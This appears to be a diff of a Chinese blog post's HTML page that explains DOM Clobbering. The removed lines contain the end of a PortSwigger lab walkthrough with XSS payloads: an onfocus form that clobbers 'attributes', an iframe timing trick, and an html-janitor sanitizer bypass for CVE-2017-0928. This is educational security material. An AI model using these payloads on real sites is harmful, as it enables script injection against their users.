-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">x</span> <span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">attributes</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>接着就是构造 XSS 了，根据题目要求，需要用户访问触发，所以我们可以利用<code>tabindex</code>属性，配合<code>form</code>的<code>onfocus</code>时间来 XSS 。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">x</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">0</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">alert(123)</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">attributes</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/p/dom-clobbering/image-20250809170141987.png"
-	width="1213"
-	height="435"
-	srcset="/p/dom-clobbering/image-20250809170141987_hu2968635661907806583.png 480w, /p/dom-clobbering/image-20250809170141987_hu5763615446239120972.png 1024w"
-	loading="lazy"
-	
-		alt="image-20250809170141987"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="278"
-		data-flex-basis="669px"
-	
-></p>
-<p>但是如果直接交给用户点击的话是不会触发的，因为评论是由 aJax 请求拿到的，直接访问的话，Dom 树是还没有评论的，得需要等待 JS 执行完成才会有评论，所以这里我们需要一个延时或者阻塞的操作。比较简单的是利用<code>iframe</code>进行<code>setTimeout</code></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">https://your-lab-id.web-security-academy.net/post?postId=3</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;setTimeout(a=&gt;this.src=this.src+&#39;#x&#39;,500)&#34;</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这里要注意一定要得等评论加载完毕再用<code>#x</code>选择<code>form</code>，所以这里的 500ms 需要根据自己的网络情况适当调整。</p>
-<h2 id="一些著名的利用漏洞">一些著名的利用漏洞
-</h2><h3 id="cve-2017-0928-bypassing-sanitization-using-dom-clobbering">CVE-2017-0928 Bypassing sanitization using DOM clobbering
-</h3><p><a class="link" href="https://github.com/guardian/html-janitor/"  target="_blank" rel="noopener"
-    >html-janitor</a> 也就是我们上文用到的 HTML filters，在 v2.0.2 当中，janitor 在循环中有这么几行代码：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">do {
-</span></span><span class="line"><span class="cl">  // Ignore nodes that have already been sanitized
-</span></span><span class="line"><span class="cl">  if (node._sanitized) {
-</span></span><span class="line"><span class="cl">    continue;
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  //...
-</span></span><span class="line"><span class="cl">  // Sanitize children
-</span></span><span class="line"><span class="cl">  this._sanitize(node);
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  // Mark node as sanitized so it&#39;s ignored in future runs
-</span></span><span class="line"><span class="cl">  node._sanitized = true;
-</span></span><span class="line"><span class="cl">} while ((node = treeWalker.nextSibling()));
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>用<code>_sanitized</code>作为标志位来标志是否已经进行标准化，但是这里，由我们上个例子可以得出，我们可以利用与上个例子类似的 payload 绕过第一个 if 就可以绕过标准化过滤了。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;form&gt;&lt;object onmouseover=alert(document.domain) name=_sanitized&gt;&lt;/object&gt;&lt;/form&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>修复方案是删除了这些判断，对子树利用递归形式进行标准化过滤。</p>
-<h3 id="xss-in-gmails-amp4email-via-dom-clobbering">XSS in GMail’s AMP4Email via DOM Clobbering
-</h3><p>这个就不细说了，感兴趣师傅可以去搜搜</p>
-
-</section>
-
-
-    <footer class="article-footer">
-    
-    <section class="article-tags">
-        
-            <a href="/tags/xss-trick/">XSS Trick</a>
-        
-    </section>
-
-
-    
-    <section class="article-copyright">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
-</svg>
-
-
-
-        <span>Licensed under 9u_l3</span>
-    </section>
-    </footer>
-
-
-    
-</article>
-
-    
-
-    
-
-<aside class="related-content--wrapper">
-    <h2 class="section-title">相关文章</h2>
-    <div class="related-content">
-        <div class="flex article-list--tile">
-            
-                
-<article class="has-image">
-    <a href="/p/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/">
-        
-        
-            <div class="article-image">
-                <img src="/p/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/1.2da44caead2bcf9b4868bfb6676fa41b.webp" 
-                        width="2688" 
-                        height="1536" 
-                        loading="lazy"
-                        alt="Featured image of post Web缓存投毒"
-                        
-                        data-hash="md5-LaRMrq0rz5tIaL&#43;2Z2&#43;kGw==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Web缓存投毒</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/client-side-desync-attackscve-2022-29361/">
-        
-        
-            <div class="article-image">
-                <img src="/p/client-side-desync-attackscve-2022-29361/1.c9eadf70ee0c9a194bd065a4277e0a36.webp" 
-                        width="3872" 
-                        height="2323" 
-                        loading="lazy"
-                        alt="Featured image of post Client-side desync attacks（CVE-2022-29361）"
-                        
-                        data-hash="md5-yerfcO4MmhlL0GWkJ34KNg==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Client-side desync attacks（CVE-2022-29361）</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/%E6%82%AC%E7%A9%BA%E6%A0%87%E8%AE%B0%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BBdangling-markup%E7%BB%95csp/">
-        
-        
-            <div class="article-image">
-                <img src="/p/%E6%82%AC%E7%A9%BA%E6%A0%87%E8%AE%B0%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BBdangling-markup%E7%BB%95csp/1.ab00a7a6e6ffb1c6f3e5ea93e9ded65c.png" 
-                        width="1216" 
-                        height="832" 
-                        loading="lazy"
-                        alt="Featured image of post 悬空标记注入攻击（Dangling markup）绕CSP"
-                        
-                        data-hash="md5-qwCnpub/scbz5eqT6d7WXA==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">悬空标记注入攻击（Dangling markup）绕CSP</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/graphql%E6%B8%97%E9%80%8F/">
-        
-        
-            <div class="article-image">
-                <img src="/p/graphql%E6%B8%97%E9%80%8F/1.a2b62067c33f9be330ab3aa20593dfe0.png" 
-                        width="960" 
-                        height="1200" 
-                        loading="lazy"
-                        alt="Featured image of post GraphQL渗透"
-                        
-                        data-hash="md5-orYgZ8M/m&#43;MwqzqiBZPf4A==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">GraphQL渗透</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/">
-        
-        
-            <div class="article-image">
-                <img src="/p/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/1.d5fee63c0ada0ad00decf0ae0ba50905.png" 
-                        width="3584" 
-                        height="1984" 
-                        loading="lazy"
-                        alt="Featured image of post 反弹shell学习"
-                        
-                        data-hash="md5-1f7mPAraCtAN7PCuC6UJBQ==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">反弹shell学习</h2>
-        </div>
-    </a>
-</article>
-
-            
-        </div>
-    </div>
-</aside>
-
-     
-    
-        
-    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
-<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
-<div id="waline" class="waline-container"></div>
-<style>
-    .waline-container {
-        background-color: var(--card-background);
-        border-radius: var(--card-border-radius);
-        box-shadow: var(--shadow-l1);
-        padding: var(--card-padding);
-        --waline-font-size: var(--article-font-size);
-    }
-    .waline-container .wl-count {
-        color: var(--card-text-color-main);
-    }
-</style><script>
-    
-    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
-</script>
-
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
-        
-            2025 - 
-        
-        2026 无敌可爱美咕噜
-    </section>
-    
-    <section class="powerby">
-        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
-        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
-    </section>
-</footer>
-
-
-    
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    
-    <div class="pswp__bg"></div>
-
-    
-    <div class="pswp__scroll-wrap">
-
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-
-        
-        <div class="pswp__ui pswp__ui--hidden">
-
-            <div class="pswp__top-bar">
-
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
-        </div>
-
-    </div>
-
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
-            >
-
-            </main>
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
-                
-                >
-            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
-<script>
-    (function () {
-        const customFont = document.createElement('link');
-        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
-
-        customFont.type = "text/css";
-        customFont.rel = "stylesheet";
-
-        document.head.appendChild(customFont);
-    }());
-</script>
-
-<style>
-  body {
-    background: url(https://0d000721999.github.io/background/1.webp) no-repeat center top;
-    background-size: cover;
-    background-attachment: fixed;
-  }
-</style>
-
- 
-<style>
-  @font-face {
-    font-family: 'ss';
-    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
-  }
-
-  :root {
-    --base-font-family: 'ss';
-    --code-font-family: 'ss';
-  }
-</style>
-<style>
-    #TableOfContents > ul, ol {
-        ul, ol {
-            display: none;
-        }
-        .open {
-            display: block;
-        }
-    }
-</style>
-
-<script>
-    function initTocHide() {
-        
-        let toc = document.querySelector(".widget--toc");
-        if (!toc) {
-            return;
-        }
-        
-        window.addEventListener('scroll', function() {
-            
-            let openUl = document.querySelectorAll(".open");
-            if (openUl.length > 0) {
-              openUl.forEach((ul) => {
-                ul.classList.remove("open")
-              })
-            }
-            
-            let currentLi = document.querySelector(".active-class");
-            if (!currentLi) {
-                return
-            }
-            
-            if (currentLi.children.length > 1) {
-                currentLi.children[1].classList.add("open")
-            }
-            
-            let ul = currentLi.parentElement;
-            do {
-                ul.classList.add("open");
-                ul = ul.parentElement.parentElement
-            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
-        });
-    }
-    initTocHide()
-</script>
-
-<style>
-    #backTopBtn {
-        display: none;
-        position: fixed;
-        bottom: 30px;
-        z-index: 99;
-        cursor: pointer;
-        width: 30px;
-        height: 30px;
-        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
-    }
-</style>
-
-<script>
-    
-
-    function initScrollTop() {
-        let rightSideBar = document.querySelector(".right-sidebar");
-        if (!rightSideBar) {
-            return;
-        }
-        
-        let btn = document.createElement("div");
-        btn.id = "backTopBtn";
-        btn.onclick = backToTop
-        rightSideBar.appendChild(btn)
-        
-        window.onscroll = function() {
-            
-            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
-                btn.style.display = "block";
-            } else {
-                btn.style.display = "none";
-            }
-        };
-    }
-
-    
-
-    function backToTop(){
-        window.scrollTo({ top: 0, behavior: "smooth" })
-    }
-
-    initScrollTop();
-</script>
-
-
-<script>   
-  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
-  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
-  const config = {
-    
-    path: {
-      homePath: "/",
-      modelPath: cdnPath + "/Resources/",
-      cssPath: cssPath,
-      tipsJsonPath: cdnPath + "/waifu-tips.json",
-      tipsJsPath: cdnPath + "/waifu-tips.js",
-      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
-      live2dSdkPath: cdnPath + "/live2d-sdk.js"
-    },
-    
-    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
-    
-    drag: {
-      enable: true,
-      direction: ["x", "y"]
-    },
-    
-    switchType: "order"
-  }
-
-  
-  if (screen.width >= 768) {
-    Promise.all([
-      loadExternalResource(config.path.cssPath, "css"),
-      loadExternalResource(config.path.live2dCorePath, "js"),
-      loadExternalResource(config.path.live2dSdkPath, "js"),
-      loadExternalResource(config.path.tipsJsPath, "js")
-    ]).then(() => {
-      initWidget({
-        waifuPath: config.path.tipsJsonPath,
-        cdnPath: config.path.modelPath,
-        tools: config.tools,
-        dragEnable: config.drag.enable,
-        dragDirection: config.drag.direction,
-        switchType: config.switchType
-      });
-    });
-  }
-
-  
-  function loadExternalResource(url, type) {
-    return new Promise((resolve, reject) => {
-      let tag;
-      if (type === "css") {
-        tag = document.createElement("link");
-        tag.rel = "stylesheet";
-        tag.href = url;
-      }
-      else if (type === "js") {
-        tag = document.createElement("script");
-        tag.src = url;
-      }
-      if (tag) {
-        tag.onload = () => resolve(url);
-        tag.onerror = () => reject(url);
-        document.head.appendChild(tag);
-      }
-    });
-  }
-</script>
-
-    </body>
-</html>
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="DOM Clobbering 我刚开始以为是DOM型XSS，结果发现完全不一样\n靶场：DOM clobbering | Web Security Academy\n参考文章：使用 Dom Clobbering 扩展 XSS-先知社区\n定义 DOM Clobbering就是通过在页面中插入HTML代码，改变javascript中全局变量或者对象属性的含义，从而永久改变javascript执行结果的一种技术。其中的“clobbering”就是指我们破坏了原本的全局变量或对象属性。\n"><title>DOM Clobbering</title><link rel=canonical href=https://0d000721999.github.io/p/dom-clobbering/><link rel=stylesheet href=/scss/style.min.e8f9fb65172830b7456cc8f040d4bbb0a7691d6eaa1e581f17d264a13d1d48d4.css><meta property='og:title' content="DOM Clobbering"><meta property='og:description' content="DOM Clobbering 我刚开始以为是DOM型XSS，结果发现完全不一样\n靶场：DOM clobbering | Web Security Academy\n参考文章：使用 Dom Clobbering 扩展 XSS-先知社区\n定义 DOM Clobbering就是通过在页面中插入HTML代码，改变javascript中全局变量或者对象属性的含义，从而永久改变javascript执行结果的一种技术。其中的“clobbering”就是指我们破坏了原本的全局变量或对象属性。\n"><meta property='og:url' content='https://0d000721999.github.io/p/dom-clobbering/'><meta property='og:site_name' content='美咕噜的小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='XSS trick'><meta property='article:published_time' content='2025-08-09T00:00:00+00:00'><meta property='article:modified_time' content='2025-08-09T00:00:00+00:00'><meta property='og:image' content='https://0d000721999.github.io/p/dom-clobbering/1_hu_8da870d3810cfab2.webp'><meta name=twitter:title content="DOM Clobbering"><meta name=twitter:description content="DOM Clobbering 我刚开始以为是DOM型XSS，结果发现完全不一样\n靶场：DOM clobbering | Web Security Academy\n参考文章：使用 Dom Clobbering 扩展 XSS-先知社区\n定义 DOM Clobbering就是通过在页面中插入HTML代码，改变javascript中全局变量或者对象属性的含义，从而永久改变javascript执行结果的一种技术。其中的“clobbering”就是指我们破坏了原本的全局变量或对象属性。\n"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://0d000721999.github.io/p/dom-clobbering/1_hu_8da870d3810cfab2.webp'><link rel="shortcut icon" href=/favicon.ico><link rel=preload href=/font/SeriousShannsNerdFontMono-Regular.bb31bd214d39201a3b7c975bff8d7d28aea776ea8f432b538b7e79013af419fc.woff2 as=font type=font/woff2 crossorigin><style>@font-face{font-family:blogmono;src:url(/font/SeriousShannsNerdFontMono-Regular.bb31bd214d39201a3b7c975bff8d7d28aea776ea8f432b538b7e79013af419fc.woff2)format("woff2");font-display:swap;font-style:normal;font-weight:400}body{background-color:#f3eeee;background-image:linear-gradient(rgba(255,255,255,.16),rgba(255,255,255,.16)),url(/background/1_hu_5012b4e0f83d2384.c8c1acd7eaca2e2d02130c7c020ff283d01dbcc672cf5f750be3a8bdb2bb246e.webp);background-repeat:no-repeat;background-position:50% 0;background-size:cover;background-attachment:fixed}@media(max-width:767px){body{background-image:linear-gradient(rgba(255,255,255,.24),rgba(255,255,255,.24)),url(/background/1_hu_de1ff494d38eb06b.adf00830bddcc1b219db2ff10dd9314f66e7f5e8dcbfce28404699e20b44b9fb.webp);background-attachment:scroll}}@media(prefers-reduced-motion:reduce){body{background-attachment:scroll}}</style></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.setItem(e,"light")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_cc7d4f5d18fa2884.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>😋</span></figure><div class=site-meta><h1 class=site-name><a href=/>美咕噜的小站</a></h1><h2 class=site-description>Ciallo～(∠・ω&lt; )⌒★</h2></div></header><ol class=menu-social><li><a href=https://buuoj.cn/users/175721 target=_blank title=BUUOJ rel=me><svg class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M7 20V4h6a4 4 0 010 8 4 4 0 010 8H7"/><line x1="7" y1="12" x2="13" y2="12"/></svg></a></li><li><a href=https://github.com/0d000721999 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>主页</span></a></li><li><a href=/%E5%85%B3%E4%BA%8E/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>关于</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>归档</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>搜索</span></a></li><li><a href=/friends/><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
+<span>友链</span></a></li><li><a href=/%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>链接</span></a></li><li class=menu-bottom-section><ol class=menu></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#定义>定义</a></li><li><a href=#举个例子>举个例子</a></li><li><a href=#前置知识>前置知识</a><ol><li><a href=#tostring>toString</a></li><li><a href=#htmlcollection>HTMLCollection</a></li><li><a href=#html-relationships>HTML Relationships</a></li><li><a href=#三级关系xyz的写法>三级关系x.y.z的写法</a></li><li><a href=#自定义属性构造>自定义属性构造</a></li></ol></li><li><a href=#bp靶场练习>bp靶场练习</a><ol><li><a href=#exploiting-dom-clobbering-to-enable-xss>Exploiting DOM clobbering to enable XSS</a></li><li><a href=#clobbering-dom-attributes-to-bypass-html-filters>Clobbering DOM attributes to bypass HTML filters</a></li></ol></li><li><a href=#一些著名的利用漏洞>一些著名的利用漏洞</a><ol><li><a href=#cve-2017-0928-bypassing-sanitization-using-dom-clobbering>CVE-2017-0928 Bypassing sanitization using DOM clobbering</a></li><li><a href=#xss-in-gmails-amp4email-via-dom-clobbering>XSS in GMail’s AMP4Email via DOM Clobbering</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/dom-clobbering/><img src=/p/dom-clobbering/1_hu_3b341373b6c16046.webp srcset="/p/dom-clobbering/1_hu_3b341373b6c16046.webp 800w, /p/dom-clobbering/1_hu_8da870d3810cfab2.webp 1600w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" width=800 height=1179 loading=eager decoding=async fetchpriority=high alt="文章封面：DOM Clobbering"></a></div><div class=article-details><header class=article-category><a href=/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ style=background-color:#264653;color:#fff>基础知识</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/dom-clobbering/>DOM Clobbering</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>2025-08-09</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 6 分钟</time></div></footer></div></header><section class=article-content><h1 id=dom-clobbering>DOM Clobbering</h1><p><del>我刚开始以为是DOM型XSS，结果发现完全不一样</del></p><p>靶场：<a class=link href=https://portswigger.net/web-security/dom-based/dom-clobbering#top target=_blank rel=noopener>DOM clobbering | Web Security Academy</a></p><p>参考文章：<a class=link href=https://xz.aliyun.com/news/6925 target=_blank rel=noopener>使用 Dom Clobbering 扩展 XSS-先知社区</a></p><h2 id=定义>定义</h2><p>DOM Clobbering就是通过在页面中插入HTML代码，改变javascript中全局变量或者对象属性的含义，从而永久改变javascript执行结果的一种技术。其中的“clobbering”就是指我们破坏了原本的全局变量或对象属性。</p><p><del>不想看前置知识可以直接跳到靶场</del></p><h2 id=举个例子>举个例子</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
